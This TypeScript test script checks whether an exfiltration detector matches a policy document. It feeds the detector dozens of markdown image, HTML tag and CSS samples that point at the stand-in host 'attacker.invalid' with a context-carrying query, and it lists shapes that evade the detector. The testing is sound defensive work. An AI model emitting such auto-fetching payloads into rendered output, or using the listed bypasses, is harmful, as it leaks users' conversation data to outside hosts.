// T72 — documentation parity, RE-DERIVED rather than re-run.
//
// The dispatch forbids accepting T71-doc-parity.ts's `parity: true`. So the
// lists in `docs/requirements/keryx-agent-first-core/policies.md` §«Auto-fetch
// floor» were transcribed HERE, independently, from lines 28/30/32/34/36/38,
// and each entry is put to the DETECTOR. Both directions:
//   - doc says covered  -> detector must flag;
//   - doc says released -> detector must not flag;
//   - the three property statements (case-insensitivity, gate decoding, the
//     exactly-three departures from context blindness) are each a row.
// Plus a REVERSE-COMPLETENESS block: shapes the document's «перечень полный»
// implies are covered, which this review measured released.
//
// Read-only, offline, synthetic hosts only. Usage: bun T72-doc.ts [out.json]
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const flags = (text: string, allowlist: string[] = []) => detectExfil(text, allowlist).length > 0;

type Row = { id: string; docSays: "covered" | "released" | "property"; text: string; flagged: boolean; ok: boolean; note?: string };
const rows: Row[] = [];
const cov = (id: string, text: string, note?: string) =>
  rows.push({ id, docSays: "covered", text, flagged: flags(text), ok: flags(text), note });
const rel = (id: string, text: string, note?: string) =>
  rows.push({ id, docSays: "released", text, flagged: flags(text), ok: !flags(text), note });
const prop = (id: string, text: string, expectFlagged: boolean, note?: string) =>
  rows.push({ id, docSays: "property", text, flagged: flags(text), ok: flags(text) === expectFlagged, note });

// ---- line 28: «Покрыто (перечень полный, не пример)» ------------------------
cov("mdInline", `![alt](${U})`);
cov("mdInlineBalanced", `![a[b]c](${U})`);
cov("mdFullRef", `![alt][r]\n\n[r]: ${U}\n`);
cov("mdCollapsedRef", `![alt][]\n\n[alt]: ${U}\n`);
cov("mdShortcutRef", `![alt]\n\n[alt]: ${U}\n`);
cov("imgSrc", `<img src="${U}">`);
cov("imgSrcset", `<img srcset="${U} 2x">`);
cov("imageSrc", `<image src="${U}">`);
cov("imageSrcset", `<image srcset="${U} 2x">`);
cov("imageHref", `<image href="${U}">`);
cov("imageXlinkHref", `<image xlink:href="${U}">`);
cov("feImageHref", `<feImage href="${U}">`);
cov("feImageXlinkHref", `<feImage xlink:href="${U}">`);
cov("inputTypeImageSrc", `<input type=image src="${U}">`);
cov("videoPoster", `<video poster="${U}"></video>`);
for (const el of ["body", "table", "td", "th", "tr", "tbody", "thead", "tfoot"]) {
  cov(`background_${el}`, `<${el} background="${U}">`);
}
cov("videoSrc", `<video src="${U}"></video>`);
cov("audioSrc", `<audio src="${U}"></audio>`);
cov("sourceSrc", `<source src="${U}">`);
cov("sourceSrcset", `<source srcset="${U} 2x">`);
cov("trackSrc", `<track src="${U}">`);
cov("iframeSrc", `<iframe src="${U}"></iframe>`);
cov("embedSrc", `<embed src="${U}">`);
cov("objectData", `<object data="${U}"></object>`);
cov("metaRefresh", `<meta http-equiv="refresh" content="0;url=${U}">`);
cov("baseHref", `<base href="${U}">`);

// ---- line 30: markdown LINK, all four spellings, released ------------------
rel("linkInline", `[text](${U})`);
rel("linkFullRef", `[text][r]\n\n[r]: ${U}\n`);
rel("linkCollapsed", `[text][]\n\n[text]: ${U}\n`);
rel("linkShortcut", `[text]\n\n[text]: ${U}\n`);
rel("refDefNoImageUse", `[r]: ${U}\n\nprose\n`, "definition line alone");

// ---- line 32: «Не покрыто намеренно» --------------------------------------
rel("scriptSrc", `<script src="${U}"></script>`);
rel("svgScriptHref", `<svg><script href="${U}"/></svg>`);
rel("linkHrefStylesheet", `<link rel="stylesheet" href="${U}">`);
rel("linkHrefPreload", `<link rel="preload" as="image" href="${U}">`);
rel("linkImagesrcset", `<link rel="preload" as="image" imagesrcset="${U} 2x">`);
rel("cssStyleAttrUrl", `<div style="background:url(${U})"></div>`);
rel("cssStyleBlockUrl", `<style>.a{background:url(${U})}</style>`);
rel("cssImport", `<style>@import url(${U});</style>`);
rel("cssImportBareString", `<style>@import "${U}";</style>`);
rel("cssFontFace", `<style>@font-face{src:url(${U})}</style>`);
rel("cssImageSet", `<style>.a{background:image-set("${U}" 1x)}</style>`);
rel("iframeSrcdoc", `<iframe srcdoc="&lt;img src=${U}&gt;"></iframe>`);

// ---- line 34: «Не покрыто никогда» ----------------------------------------
rel("frameSrc", `<frame src="${U}">`);
rel("svgUseHref", `<svg><use href="${U}#a"/></svg>`);
rel("aHref", `<a href="${U}">x</a>`);
rel("aPing", `<a href="/x" ping="${U}">x</a>`);
rel("areaHref", `<area href="${U}">`);
rel("formAction", `<form action="${U}"></form>`);
rel("buttonFormaction", `<button formaction="${U}"></button>`);
rel("inputFormaction", `<input type=submit formaction="${U}">`);

// ---- line 30 + 36 + 38: the three property statements ----------------------
prop("propGateDecodedInput", `<input type="&#105;mage" src="${U}">`, true, "line 30: gate value decoded");
prop("propGateDecodedMeta", `<meta http-equiv="&#114;efresh" content="0;url=${U}">`, true, "line 30");
prop("propGateExact", `<meta http-equiv="refresh&#59;" content="0;url=${U}">`, false, "line 30 implies EXACT after decoding");
prop("propCaseVideo", `<Video src="${U}" />`, true, "line 36: ASCII case-insensitive");
prop("propCaseIframe", `<Iframe src="${U}" />`, true, "line 36");
prop("propCaseEmbed", `<Embed src="${U}" />`, true, "line 36");
prop("propCaseUpperImg", `<IMG SRC="${U}">`, true, "line 36");
prop("propContextComment", `<!-- <img src="${U}"> -->`, true, "line 36: quoted in an HTML comment is still a finding");
prop("propContextFence", "```html\n" + `<img src="${U}">` + "\n```\n", true, "line 36: fenced code block");
prop("propContextTemplate", `<template><img src="${U}"></template>`, true, "line 36: <template>");
prop("propDeparture1AttrValue", `<img alt="<img src=${U}>" src="/a.png">`, false, "line 38 (1): markup inside a quoted attribute value is not a finding");
prop("propDeparture2Unterminated", `<img alt="x <img src=${U}>`, false, "line 38 (2): unterminated quoted value swallows the rest");
prop("propDeparture3BaseInComment", `<!-- <base href="${U}"> -->`, true, "line 38 (3): base is flagged wherever it appears");
prop("propDeparture3BaseInFence", "```html\n" + `<base href="${U}">` + "\n```\n", true, "line 38 (3)");

// ---- REVERSE COMPLETENESS: shapes «перечень полный» implies are covered ----
const LONG = "L".repeat(1200);
const reverse: { id: string; text: string; allowlist?: string[]; why: string }[] = [
  { id: "revLinkedInlineImage", text: `[![b](${U})](https://ci.example.com/j)`, why: "the inline image spelling, wrapped in a link (README badge)" },
  { id: "revLinkedShortcutImage", text: `[![b]](https://ci.example.com/j)\n\n[b]: ${U}\n`, why: "shortcut image inside a link" },
  { id: "revLongLabelFullRef", text: `![a][${LONG}]\n\n[${LONG}]: ${U}\n`, why: "full reference whose label exceeds MAX_REFERENCE_LABEL" },
  { id: "revLabelWhitespace", text: `![a][b  c]\n\n[b c]: ${U}\n`, why: "CommonMark collapses internal whitespace in a label; the detector does not" },
  { id: "revSrcsetCharrefComma", text: `<img srcset="https://cdn.example.org/a.png&#44;${U} 2x">`, allowlist: ["cdn.example.org"], why: "srcset candidate split runs on the RAW value, under a non-empty allowlist" },
];
for (const r of reverse) {
  const flagged = flags(r.text, r.allowlist ?? []);
  rows.push({ id: r.id, docSays: "covered", text: r.text, flagged, ok: flagged, note: `REVERSE: ${r.why}` });
}

for (const r of rows) {
  console.log(
    `${r.ok ? "ok  " : "FAIL"} ${r.id.padEnd(28)} doc=${r.docSays.padEnd(8)} flagged=${String(r.flagged).padEnd(5)} ${r.note ?? ""}`,
  );
}

const summary = {
  totalRows: rows.length,
  coveredRows: rows.filter((r) => r.docSays === "covered").length,
  releasedRows: rows.filter((r) => r.docSays === "released").length,
  propertyRows: rows.filter((r) => r.docSays === "property").length,
  docSaysCoveredButReleased: rows.filter((r) => r.docSays === "covered" && !r.flagged).map((r) => r.id),
  docSaysReleasedButFlagged: rows.filter((r) => r.docSays === "released" && r.flagged).map((r) => r.id),
  propertyFailures: rows.filter((r) => r.docSays === "property" && !r.ok).map((r) => r.id),
  parity: rows.every((r) => r.ok),
};
console.log(JSON.stringify(summary, null, 2));

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ summary, rows }, null, 2));
